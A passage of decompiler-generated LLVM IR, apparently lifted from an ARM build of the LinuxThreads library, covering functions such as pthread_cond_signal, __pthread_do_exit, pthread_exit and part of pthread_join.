  %v2_ea6c = icmp eq i8 %v3_ea68, 0
  br i1 %v2_ea6c, label %dec_label_pc_ea88, label %dec_label_pc_ea74

dec_label_pc_ea74:                                ; preds = %dec_label_pc_ea34
  %v1_ea78 = add i32 %v0_ea08, 64
  %v2_ea78 = inttoptr i32 %v1_ea78 to i8*
  %v3_ea78 = load i8, i8* %v2_ea78, align 1
  %v2_ea7c = icmp eq i8 %v3_ea78, 0
  br i1 %v2_ea7c, label %dec_label_pc_ea98, label %dec_label_pc_ea88

dec_label_pc_ea88:                                ; preds = %dec_label_pc_ea74, %dec_label_pc_ea34
  %v0_ea8c = load i32, i32* @r5, align 4
  %v1_ea8c = add i32 %v0_ea8c, 8
  %v2_ea90 = call i32 @_enqueue(i32 %v1_ea8c, i32 %v0_ea08)
  br label %dec_label_pc_ea98

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea74, %dec_label_pc_ea88
  %storemerge = phi i32 [ 0, %dec_label_pc_ea88 ], [ 1, %dec_label_pc_ea74 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_ea98 = load i32, i32* @r5, align 4
  %v1_ea9c = call i32 @__pthread_unlock(i32 %v0_ea98)
  %v0_eaa0 = load i32, i32* @r4, align 4
  %v2_eaa0 = icmp eq i32 %v0_eaa0, 0
  br i1 %v2_eaa0, label %dec_label_pc_eab8, label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_ea98
  %v2_eab0 = call i32 @___pthread_set_own_extricate_if(i32 %v0_ea08, i32 0)
  br label %dec_label_pc_eb4c

dec_label_pc_eab8:                                ; preds = %dec_label_pc_ea98
  %v0_eab8 = load i32, i32* @r6, align 4
  store i32 %v0_eab8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_eac8.461 to i32), i32* @lr, align 4
  %v1_eac4 = call i32 @pthread_mutex_unlock()
  store i32 %v0_ea08, i32* @r0, align 4
  %v1_eacc9 = call i32 @_suspend.7(i32 %v0_ea08)
  %v3_ead410 = load i8, i8* %v4_ea48, align 1
  %v2_ead812 = icmp eq i8 %v3_ead410, 0
  %v1_eae4 = add i32 %v0_ea08, 440
  %v2_eae4 = inttoptr i32 %v1_eae4 to i8*
  br i1 %v2_ead812, label %dec_label_pc_eae0.lr.ph, label %dec_label_pc_eb08

dec_label_pc_eae0.lr.ph:                          ; preds = %dec_label_pc_eab8
  %v1_eaf4 = add i32 %v0_ea08, 64
  %v2_eaf4 = inttoptr i32 %v1_eaf4 to i8*
  br label %dec_label_pc_eae0

dec_label_pc_eae0:                                ; preds = %dec_label_pc_eae0.lr.ph, %dec_label_pc_eb00
  %v3_eae4 = load i8, i8* %v2_eae4, align 1
  %v2_eae8 = icmp eq i8 %v3_eae4, 0
  br i1 %v2_eae8, label %dec_label_pc_eb00, label %dec_label_pc_eaf0

dec_label_pc_eaf0:                                ; preds = %dec_label_pc_eae0
  %v3_eaf4 = load i8, i8* %v2_eaf4, align 1
  %v2_eaf8 = icmp eq i8 %v3_eaf4, 0
  br i1 %v2_eaf8, label %dec_label_pc_eb08, label %dec_label_pc_eb00

dec_label_pc_eb00:                                ; preds = %dec_label_pc_eaf0, %dec_label_pc_eae0
  %v0_eb00 = load i32, i32* @r4, align 4
  %v1_eb00 = add i32 %v0_eb00, 1
  store i32 %v1_eb00, i32* @r4, align 4
  store i32 %v0_ea08, i32* @r0, align 4
  %v1_eacc = call i32 @_suspend.7(i32 %v0_ea08)
  %v3_ead4 = load i8, i8* %v4_ea48, align 1
  %v2_ead8 = icmp eq i8 %v3_ead4, 0
  br i1 %v2_ead8, label %dec_label_pc_eae0, label %dec_label_pc_eb08

dec_label_pc_eb08:                                ; preds = %dec_label_pc_eaf0, %dec_label_pc_eb00, %dec_label_pc_eab8
  %v2_eb10 = call i32 @___pthread_set_own_extricate_if(i32 %v0_ea08, i32 0)
  %v3_eb18 = load i8, i8* %v2_eae4, align 1
  %v2_eb1c = icmp eq i8 %v3_eb18, 0
  br i1 %v2_eb1c, label %dec_label_pc_eb60, label %dec_label_pc_eb24

dec_label_pc_eb24:                                ; preds = %dec_label_pc_eb08
  %v1_eb28 = add i32 %v0_ea08, 64
  %v2_eb28 = inttoptr i32 %v1_eb28 to i8*
  %v3_eb28 = load i8, i8* %v2_eb28, align 1
  %v4_eb28 = zext i8 %v3_eb28 to i32
  store i32 %v4_eb28, i32* @r2, align 4
  %v2_eb2c = icmp eq i8 %v3_eb28, 0
  br i1 %v2_eb2c, label %dec_label_pc_eb34, label %dec_label_pc_eb60

dec_label_pc_eb34:                                ; preds = %dec_label_pc_eb24
  %v0_eb38 = load i32, i32* @r6, align 4
  store i8 0, i8* %v2_eae4, align 1
  store i32 60236, i32* @lr, align 4
  %v2_eb48 = call i32 @pthread_mutex_lock(i32 %v0_eb38)
  br label %dec_label_pc_eb4c

dec_label_pc_eb4c:                                ; preds = %dec_label_pc_eaa8, %dec_label_pc_eb34
  %v2_eb54 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_e9fc)
  br label %dec_label_pc_eb58

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb60, %dec_label_pc_eb4c
  store i32 %v0_ea08, i32* @r0, align 4
  %v1_eb5c = call i32 @_restart(i32 %v0_ea08)
  br label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb24, %dec_label_pc_eb08, %dec_label_pc_eb58
  %v0_eb60 = load i32, i32* @r4, align 4
  %v1_eb60 = add i32 %v0_eb60, -1
  store i32 %v1_eb60, i32* @r4, align 4
  %v2_eb60 = icmp eq i32 %v0_eb60, 0
  br i1 %v2_eb60, label %dec_label_pc_eb68, label %dec_label_pc_eb58

dec_label_pc_eb68:                                ; preds = %dec_label_pc_eb60
  %v0_eb68 = load i32, i32* @r6, align 4
  store i32 60280, i32* @lr, align 4
  %v2_eb74 = call i32 @pthread_mutex_lock(i32 %v0_eb68)
  br label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_ea20, %dec_label_pc_eb68
  %storemerge25 = phi i32 [ 0, %dec_label_pc_eb68 ], [ 22, %dec_label_pc_ea20 ]
  store i32 %v3_e9f8, i32* @r4, align 4
  store i32 %v6_e9f8, i32* @r5, align 4
  ret i32 %storemerge25

; uselistorder directives
  uselistorder i8* %v4_ea48, { 1, 0, 2 }
  uselistorder i32 %v0_ea08, { 0, 1, 9, 10, 14, 13, 11, 12, 16, 15, 8, 6, 7, 4, 5, 3, 2, 17, 18 }
  uselistorder i32 (i32)* @_suspend.7, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @_enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @___pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @_thread_self.6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb7c, { 1, 0 }
  uselistorder label %dec_label_pc_eb60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eb4c, { 1, 0 }
  uselistorder label %dec_label_pc_eb08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eae0, { 1, 0 }
  uselistorder label %dec_label_pc_ea98, { 1, 0 }
  uselistorder label %dec_label_pc_ea34, { 1, 2, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_eb9c = call i32 @__pthread_lock(i32 %arg1, i32 0)
  %v1_eba0 = add i32 %arg1, 8
  %v2_eba0 = inttoptr i32 %v1_eba0 to i32*
  %v3_eba0 = load i32, i32* %v2_eba0, align 4
  store i32 %v3_eba0, i32* @r4, align 4
  %v2_eba4 = icmp eq i32 %v3_eba0, 0
  br i1 %v2_eba4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v2_eba8 = add i32 %v3_eba0, 8
  %v3_eba8 = inttoptr i32 %v2_eba8 to i32*
  %v4_eba8 = load i32, i32* %v3_eba8, align 4
  store i32 %v4_eba8, i32* %v2_eba0, align 4
  %v2_ebb4 = load i32, i32* @r4, align 4
  %v3_ebb4 = add i32 %v2_ebb4, 8
  %v4_ebb4 = inttoptr i32 %v3_ebb4 to i32*
  store i32 0, i32* %v4_ebb4, align 4
  %v0_ebb8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v0_ebb8 = phi i32 [ %arg1, %entry ], [ %v0_ebb8.pre, %bb ]
  %v1_ebbc = call i32 @__pthread_unlock(i32 %v0_ebb8)
  %v0_ebc0 = load i32, i32* @r4, align 4
  %v2_ebc0 = icmp eq i32 %v0_ebc0, 0
  br i1 %v2_ebc0, label %dec_label_pc_ebd8, label %dec_label_pc_ebc8

dec_label_pc_ebc8:                                ; preds = %.thread2
  %v3_ebcc = add i32 %v0_ebc0, 441
  %v4_ebcc = inttoptr i32 %v3_ebcc to i8*
  store i8 1, i8* %v4_ebcc, align 1
  %v0_ebd0 = load i32, i32* @r4, align 4
  store i32 %v0_ebd0, i32* @r0, align 4
  %v1_ebd4 = call i32 @_restart(i32 %v0_ebd0)
  br label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %.thread2, %dec_label_pc_ebc8
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @_restart, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v1_ebe0 = load i32, i32* @r0, align 4
  ret i32 %v1_ebe0
}

define i32 @__linuxthreads_death_event(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ebe4 = load i32, i32* @r0, align 4
  ret i32 %v1_ebe4
}

define i32 @__linuxthreads_reap_event(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ebe8 = load i32, i32* @r0, align 4
  ret i32 %v1_ebe8
}

define i32 @___pthread_set_own_extricate_if.8(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ebec = load i32, i32* @r4, align 4
  store i32 %v3_ebec, i32* %stack_var_-12, align 4
  %v9_ebec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_ebf0 = icmp eq i32 %arg2, 0
  %v0_ebf4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ebf4, i32* %r4.global-to-local, align 4
  br i1 %v2_ebf0, label %dec_label_pc_ec10, label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %entry
  %v1_ec00 = add i32 %v0_ebf4, 64
  %v2_ec00 = inttoptr i32 %v1_ec00 to i8*
  %v3_ec00 = load i8, i8* %v2_ec00, align 1
  %v2_ec04 = icmp eq i8 %v3_ec00, 0
  br i1 %v2_ec04, label %dec_label_pc_ec18, label %bb

bb:                                               ; preds = %dec_label_pc_ec00
  store i32 %v3_ebec, i32* @r4, align 4
  ret i32 %v0_ebf4

dec_label_pc_ec10:                                ; preds = %entry
  %v1_ec10 = add i32 %v0_ebf4, 28
  %v2_ec10 = inttoptr i32 %v1_ec10 to i32*
  %v3_ec10 = load i32, i32* %v2_ec10, align 4
  store i32 %v3_ec10, i32* %r0.global-to-local, align 4
  %v2_ec14 = call i32 @__pthread_lock(i32 %v3_ec10, i32 %v0_ebf4)
  store i32 %v2_ec14, i32* %r0.global-to-local, align 4
  %v0_ec18.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_ec1c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec18

dec_label_pc_ec18:                                ; preds = %dec_label_pc_ec00, %dec_label_pc_ec10
  %v1_ec1c = phi i32 [ %v0_ebf4, %dec_label_pc_ec00 ], [ %v1_ec1c.pre, %dec_label_pc_ec10 ]
  %v0_ec1c = phi i32 [ %arg2, %dec_label_pc_ec00 ], [ %v0_ec18.pre, %dec_label_pc_ec10 ]
  %v2_ec18 = icmp eq i32 %v0_ec1c, 0
  %v2_ec1c = add i32 %v1_ec1c, 444
  %v3_ec1c = inttoptr i32 %v2_ec1c to i32*
  store i32 %v0_ec1c, i32* %v3_ec1c, align 4
  br i1 %v2_ec18, label %bb7, label %bb6

bb6:                                              ; preds = %dec_label_pc_ec18
  %v3_ec20 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ec20, i32* @r4, align 4
  %v12_ec20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_ec20

bb7:                                              ; preds = %dec_label_pc_ec18
  %v0_ec24 = load i32, i32* %r4.global-to-local, align 4
  %v1_ec24 = add i32 %v0_ec24, 28
  %v2_ec24 = inttoptr i32 %v1_ec24 to i32*
  %v3_ec24 = load i32, i32* %v2_ec24, align 4
  store i32 %v3_ec24, i32* %r0.global-to-local, align 4
  %v2_ec28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ec28, i32* @r4, align 4
  store i32 %v9_ebec, i32* @lr, align 4
  %v1_ec2c = call i32 @__pthread_unlock(i32 %v3_ec24)
  store i32 %v1_ec2c, i32* %r0.global-to-local, align 4
  ret i32 %v1_ec2c

; uselistorder directives
  uselistorder i32 %v0_ebf4, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 6, 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_ec18, { 1, 0 }
}

define i32 @_thread_self.9() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_ec34 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_ec38 = load i32, i32* @sp, align 4
  %v3_ec38 = icmp ult i32 %v0_ec38, %v2_ec34
  %v1_ec3c = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_ec38, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_ec58, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_ec58 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_ec4c = load i32, i32* @global_var_2be50.182, align 4
  %v3_ec50 = icmp ult i32 %v0_ec38, %v2_ec4c
  br i1 %v3_ec50, label %bb4, label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %bb3
  %v2_ec5c = load i32, i32* @global_var_2be54.184, align 4
  %v3_ec60 = icmp ult i32 %v0_ec38, %v2_ec5c
  br i1 %v3_ec60, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_ec58, %bb3
  %v2_ec70 = load i32, i32* @global_var_30238.188, align 4
  %v3_ec74 = and i32 %v1_ec3c, -2097152
  %v4_ec74 = xor i32 %v3_ec74, -2097152
  %v2_ec7c = icmp eq i32 %v2_ec70, 0
  %v1_ec80 = sub i32 -477, %v4_ec74
  br i1 %v2_ec7c, label %dec_label_pc_ec8c, label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %bb4
  %v1_ec88 = call i32 @__pthread_find_self(i32 %v1_ec80)
  br label %dec_label_pc_ec8c

dec_label_pc_ec8c:                                ; preds = %bb4, %dec_label_pc_ec88
  %v0_ec8c = phi i32 [ %v1_ec80, %bb4 ], [ %v1_ec88, %dec_label_pc_ec88 ]
  %v1_ec8c = add i32 %v0_ec8c, -3
  ret i32 %v1_ec8c

; uselistorder directives
  uselistorder i32 %v1_ec80, { 1, 0 }
  uselistorder label %dec_label_pc_ec8c, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_ecb8 = call i32 @_thread_self.9()
  %v2_ecc8 = call i32 @__pthread_lock(i32 %arg1, i32 %v0_ecb8)
  %v1_eccc = add i32 %arg1, 8
  %v2_eccc = inttoptr i32 %v1_eccc to i32*
  %v3_eccc = load i32, i32* %v2_eccc, align 4
  %v1_ecd4 = add i32 %v3_eccc, 56
  %v2_ecd4 = inttoptr i32 %v1_ecd4 to i32*
  %v3_ecd4 = load i32, i32* %v2_ecd4, align 4
  store i32 %v3_ecd4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %v2_ecd4, align 4
  %v1_ece0 = call i32 @__pthread_unlock(i32 %arg1)
  %v0_ece4 = load i32, i32* %r4.global-to-local, align 4
  %v2_ece4 = icmp eq i32 %v0_ece4, 0
  br i1 %v2_ece4, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v0_ecec = phi i32 [ 0, %entry ], [ 1, %bb ]
  ret i32 %v0_ecec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @_suspend.10(i32 %arg1) local_unnamed_addr {
entry:
  %v0_ecf8 = load i32, i32* @r0, align 4
  %v1_ecf8 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_ecf8)
  ret i32 %v1_ecf8

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 2, 6, 0, 5, 4, 3, 1 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v2_ecfc = ptrtoint i32* %stack_var_-148 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_ed08 = call i32 @_thread_self.9()
  %v3_ed10 = add i32 %v0_ed08, 64
  %v4_ed10 = inttoptr i32 %v3_ed10 to i8*
  store i8 1, i8* %v4_ed10, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_ed08, i32* @r6, align 4
  %v3_ed1c = add i32 %v0_ed08, 65
  %v4_ed1c = inttoptr i32 %v3_ed1c to i8*
  store i8 0, i8* %v4_ed1c, align 1
  %v0_ed20 = load i32, i32* @r4, align 4
  %v1_ed24 = call i32 @__pthread_perform_cleanup(i32 %v0_ed20)
  %v1_ed28 = call i32 @__pthread_destroy_specifics(i32 %v1_ed24)
  %v0_ed2c = load i32, i32* @r6, align 4
  %v1_ed2c = add i32 %v0_ed2c, 28
  %v2_ed2c = inttoptr i32 %v1_ed2c to i32*
  %v3_ed2c = load i32, i32* %v2_ed2c, align 4
  %v2_ed34 = call i32 @__pthread_lock(i32 %v3_ed2c, i32 %v0_ed2c)
  store i32 %v2_ed34, i32* @r0, align 4
  %v0_ed38 = load i32, i32* @r6, align 4
  %v1_ed38 = add i32 %v0_ed38, 412
  %v2_ed38 = inttoptr i32 %v1_ed38 to i32*
  %v3_ed38 = load i32, i32* %v2_ed38, align 4
  store i32 %v3_ed38, i32* %r3.global-to-local, align 4
  %v2_ed3c = icmp eq i32 %v3_ed38, 0
  %v0_ed40 = load i32, i32* @r5, align 4
  %v2_ed40 = add i32 %v0_ed38, 48
  %v3_ed40 = inttoptr i32 %v2_ed40 to i32*
  store i32 %v0_ed40, i32* %v3_ed40, align 4
  br i1 %v2_ed3c, label %dec_label_pc_ed78, label %dec_label_pc_ed48

dec_label_pc_ed48:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_3023c.215 to i32), i32* %r3.global-to-local, align 4
  %v0_ed4c = load i32, i32* @r6, align 4
  %v1_ed4c = add i32 %v0_ed4c, 416
  %v2_ed4c = inttoptr i32 %v1_ed4c to i32*
  %v3_ed4c = load i32, i32* %v2_ed4c, align 4
  %v2_ed50 = load i32, i32* @global_var_3023c.215, align 4
  %v2_ed54 = or i32 %v2_ed50, %v3_ed4c
  store i32 %v2_ed54, i32* %r3.global-to-local, align 4
  %v1_ed58 = and i32 %v2_ed54, 256
  %v2_ed58 = icmp eq i32 %v1_ed58, 0
  br i1 %v2_ed58, label %dec_label_pc_ed78, label %dec_label_pc_ed60

dec_label_pc_ed60:                                ; preds = %dec_label_pc_ed48
  %v2_ed64 = add i32 %v0_ed4c, 424
  %v3_ed64 = inttoptr i32 %v2_ed64 to i32*
  store i32 9, i32* %v3_ed64, align 4
  store i32 ptrtoint (i32* @global_var_30244.217 to i32), i32* %r3.global-to-local, align 4
  %v0_ed6c = load i32, i32* @r6, align 4
  %v2_ed6c = add i32 %v0_ed6c, 428
  %v3_ed6c = inttoptr i32 %v2_ed6c to i32*
  store i32 %v0_ed6c, i32* %v3_ed6c, align 4
  %v0_ed70 = load i32, i32* @r6, align 4
  %v1_ed70 = load i32, i32* %r3.global-to-local, align 4
  %v2_ed70 = inttoptr i32 %v1_ed70 to i32*
  store i32 %v0_ed70, i32* %v2_ed70, align 4
  %v1_ed74 = call i32 @__linuxthreads_death_event(i32 %v2_ed34)
  br label %dec_label_pc_ed78

dec_label_pc_ed78:                                ; preds = %dec_label_pc_ed48, %entry, %dec_label_pc_ed60
  %v0_ed78 = load i32, i32* @r6, align 4
  %v1_ed78 = add i32 %v0_ed78, 56
  %v2_ed78 = inttoptr i32 %v1_ed78 to i32*
  %v3_ed78 = load i32, i32* %v2_ed78, align 4
  store i32 %v3_ed78, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ed80 = add i32 %v0_ed78, 44
  %v4_ed80 = inttoptr i32 %v3_ed80 to i8*
  store i8 1, i8* %v4_ed80, align 1
  %v0_ed84 = load i32, i32* @r6, align 4
  %v1_ed84 = add i32 %v0_ed84, 28
  %v2_ed84 = inttoptr i32 %v1_ed84 to i32*
  %v3_ed84 = load i32, i32* %v2_ed84, align 4
  %v1_ed88 = call i32 @__pthread_unlock(i32 %v3_ed84)
  %v0_ed8c = load i32, i32* %r4.global-to-local, align 4
  %v2_ed8c = icmp eq i32 %v0_ed8c, 0
  br i1 %v2_ed8c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_ed78
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_ed78, %bb
  store i32 60824, i32* @lr, align 4
  %v1_ed94 = xor i1 %v2_ed8c, true
  call void @__pseudo_cond_branch(i1 %v1_ed94, i32 ptrtoint (i32* @global_var_d674.471 to i32))
  store i32 ptrtoint (i32** @global_var_2b480.199 to i32), i32* %r3.global-to-local, align 4
  %v2_ed9c = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_ed9c, i32* @r4, align 4
  %v0_eda0 = load i32, i32* @r6, align 4
  %v9_eda0 = icmp eq i32 %v0_eda0, %v2_ed9c
  br i1 %v9_eda0, label %dec_label_pc_eda8, label %dec_label_pc_ee00

dec_label_pc_eda8:                                ; preds = %bb3
  %v2_edac = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_edac, i32* %r3.global-to-local, align 4
  %v1_edb0 = icmp slt i32 %v2_edac, 0
  br i1 %v1_edb0, label %dec_label_pc_ee00, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %dec_label_pc_eda8
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v2_ed9c, i32* %stack_var_-148, align 4
  br label %dec_label_pc_edc4

dec_label_pc_edc4:                                ; preds = %dec_label_pc_ede0.dec_label_pc_edc4_crit_edge, %dec_label_pc_edb8
  %v2_edcc = phi i32 [ %v2_edcc.pre, %dec_label_pc_ede0.dec_label_pc_edc4_crit_edge ], [ %v2_edac, %dec_label_pc_edb8 ]
  store i32 ptrtoint (i32* @global_var_2b484.197 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_ecfc, i32* @r1, align 4
  store i32 %v2_edcc, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_edd4 = call i32 @__libc_write(i32 %v2_edcc, i32 %v2_ecfc)
  %v3_edd8 = icmp eq i32 %v2_edd4, -1
  br i1 %v3_edd8, label %dec_label_pc_ede0, label %dec_label_pc_edf0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_edc4
  %v0_ede0 = call i32 @__errno_location()
  %v1_ede4 = inttoptr i32 %v0_ede0 to i32*
  %v2_ede4 = load i32, i32* %v1_ede4, align 4
  store i32 %v2_ede4, i32* %r3.global-to-local, align 4
  %v7_ede8 = icmp eq i32 %v2_ede4, 4
  br i1 %v7_ede8, label %dec_label_pc_ede0.dec_label_pc_edc4_crit_edge, label %dec_label_pc_edf0

dec_label_pc_ede0.dec_label_pc_edc4_crit_edge:    ; preds = %dec_label_pc_ede0
  %v2_edcc.pre = load i32, i32* @global_var_2b484.197, align 4
  br label %dec_label_pc_edc4

dec_label_pc_edf0:                                ; preds = %dec_label_pc_edc4, %dec_label_pc_ede0
  %v0_edf0 = load i32, i32* @r4, align 4
  store i32 %v0_edf0, i32* @r0, align 4
  %v1_edf4 = call i32 @_suspend.10(i32 %v0_edf0)
  %v1_edfc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ee00

dec_label_pc_ee00:                                ; preds = %bb3, %dec_label_pc_eda8, %dec_label_pc_edf0
  %v1_ee04 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_edcc, { 1, 0 }
  uselistorder i32 %v0_ed6c, { 1, 0 }
  uselistorder i32 %v0_ed08, { 1, 0, 2 }
  uselistorder i32 %v2_ecfc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_2b480.199 to i32*), { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 428, { 2, 0, 1 }
  uselistorder i32 416, { 2, 0, 1 }
  uselistorder i32 412, { 3, 0, 1, 2 }
  uselistorder i32 65, { 9, 5, 0, 6, 7, 8, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_ee00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_edf0, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %dec_label_pc_ed78, { 2, 0, 1 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_ee18 = ptrtoint i32* %stack_var_0 to i32
  %v0_ee1c = load i32, i32* @r0, align 4
  %v2_ee1c = call i32 @__pthread_do_exit(i32 %v0_ee1c, i32 %v1_ee18)
  ret i32 %v2_ee1c
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v2_ee24 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %arg1, i32* @r7, align 4
  %v0_ee30 = call i32 @_thread_self.9()
  %v0_ee38 = load i32, i32* @r7, align 4
  %v3_ee3c = urem i32 %v0_ee38, 1024
  %v4_ee40 = mul nuw nsw i32 %v3_ee3c, 16
  %v5_ee40 = add i32 %v4_ee40, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %v5_ee40, i32* %stack_var_-36, align 4
  %v2_ee5c = call i32 @__pthread_lock(i32 %v5_ee40, i32 %v0_ee30)
  %v0_ee60 = load i32, i32* @r5, align 4
  %v1_ee60 = add i32 %v0_ee60, 8
  %v2_ee60 = inttoptr i32 %v1_ee60 to i32*
  %v3_ee60 = load i32, i32* %v2_ee60, align 4
  store i32 %v3_ee60, i32* @r4, align 4
  %v2_ee64 = icmp eq i32 %v3_ee60, 0
  br i1 %v2_ee64, label %dec_label_pc_ee78, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %entry
  %v1_ee6c = add i32 %v3_ee60, 16
  %v2_ee6c = inttoptr i32 %v1_ee6c to i32*
  %v3_ee6c = load i32, i32* %v2_ee6c, align 4
  %v1_ee70 = load i32, i32* @r7, align 4
  %v9_ee70 = icmp eq i32 %v3_ee6c, %v1_ee70
  br i1 %v9_ee70, label %dec_label_pc_ee88, label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee6c, %entry
  %v1_ee7c = call i32 @__pthread_unlock(i32 %v0_ee60)
  br label %dec_label_pc_efec

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee6c
  %v9_ee8c = icmp eq i32 %v3_ee60, %v0_ee30
  br i1 %v9_ee8c, label %dec_label_pc_ee94, label %dec_label_pc_eea4

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee88
  %v1_ee98 = call i32 @__pthread_unlock(i32 %v0_ee60)
  br label %dec_label_pc_efec

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ee88
  %v1_eea4 = add i32 %v3_ee60, 45
  %v2_eea4 = inttoptr i32 %v1_eea4 to i8*
  %v3_eea4 = load i8, i8* %v2_eea4, align 1
  %v2_eea8 = icmp eq i8 %v3_eea4, 0
  br i1 %v2_eea8, label %dec_label_pc_eeb0, label %dec_label_pc_eebc

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_eea4
  %v1_eeb0 = add i32 %v3_ee60, 56
  %v2_eeb0 = inttoptr i32 %v1_eeb0 to i32*
  %v3_eeb0 = load i32, i32* %v2_eeb0, align 4
  %v2_eeb4 = icmp eq i32 %v3_eeb0, 0
  br i1 %v2_eeb4, label %dec_label_pc_eecc, label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %dec_label_pc_eea4, %dec_label_pc_eeb0
  %v1_eec0 = call i32 @__pthread_unlock(i32 %v0_ee60)
  br label %dec_label_pc_efec

dec_label_pc_eecc:                                ; preds = %dec_label_pc_eeb0
  %v1_eecc = add i32 %v3_ee60, 44
  %v2_eecc = inttoptr i32 %v1_eecc to i8*
